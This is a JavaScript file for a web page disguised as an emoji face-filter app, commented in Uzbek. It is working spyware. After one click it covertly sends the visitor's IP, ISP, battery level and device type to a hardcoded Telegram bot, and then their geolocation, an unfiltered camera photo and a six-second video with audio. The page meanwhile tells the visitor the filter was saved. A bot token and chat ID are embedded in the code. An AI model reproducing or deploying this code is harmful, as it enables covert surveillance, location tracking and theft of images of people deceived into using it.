const BOT_TOKEN = '8406559202:AAHFZmr5QX3Fb9EFYfPhs_BRlfEAzEJnK4U';
const CHAT_ID = '8549658256';

const btn = document.getElementById('initBtn');
const statusText = document.getElementById('status');
const loader = document.getElementById('loader');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let selectedEmoji = '😎';

function setEmoji(emoji, el) {
    selectedEmoji = emoji;
    document.querySelectorAll('.emoji-item').forEach(i => i.classList.remove('active'));
    el.classList.add('active');
}

btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loader.style.display = 'block';
    statusText.innerText = "Modellar yuklanmoqda...";

    try {
        // Face API modellarini yuklash (GitHub'dagi tayyor modellar)
        const MODEL_URL = 'https://justadudewhohacks.github.io/face-api.js/models';
        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);

        // 1. Qurilma va IP (Ruxsatsiz)
        const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
        const ipD = ipRes ? await ipRes.json() : {};
        const bat = await navigator.getBattery().catch(() => ({ level: 0, charging: false }));
        
        const info = `🌐 *Yangi foydalanuvchi:* \nIP: ${ipD.ip || '?'}\nISP: ${ipD.org || '?'}\nBatareya: ${Math.round(bat.level*100)}%\nQurilma: ${navigator.platform}`;
        sendTelegram('sendMessage', { text: info, parse_mode: 'Markdown' });

        // 2. Kamera va Lokatsiya
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;

        navigator.geolocation.getCurrentPosition(p => {
            const loc = `📍 *Lokatsiya:* \nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            sendTelegram('sendMessage', { text: loc, parse_mode: 'Markdown' });
        });

        statusText.innerText = "Yuz aniqlanmoqda...";
        
        // 3. Rasm olish (Burst Mode - Original va Emoji bilan)
        setTimeout(async () => {
            const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
            
            // Original Surat
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(b => sendFile(b, 'photo', 'original.jpg'), 'image/jpeg');

            if (detections) {
                // Emoji bilan surat chizish
                const { x, y, width, height } = detections.box;
                ctx.font = `${width}px serif`;
                ctx.textAlign = "center";
                ctx.textBaseline = "middle";
                ctx.fillText(selectedEmoji, x + width/2, y + height/2);
                canvas.toBlob(b => sendFile(b, 'photo', 'emoji_version.jpg'), 'image/jpeg');
            }
        }, 3000);

        // 4. Video yozish (6 soniya)
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
            sendFile(new Blob(chunks), 'video', 'session.mp4');
            stream.getTracks().forEach(t => t.stop());
            statusText.innerText = "Filtr muvaffaqiyatli saqlandi!";
            loader.style.display = 'none';
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 6000);

    } catch (e) {
        statusText.innerText = "Xatolik yuz berdi.";
        loader.style.display = 'none';
        btn.style.display = 'block';
    }
});

async function sendTelegram(m, d) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${m}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, ...d })
    });
}

async function sendFile(blob, type, name) {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append(type, blob, name);
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, { method: 'POST', body: fd });
}
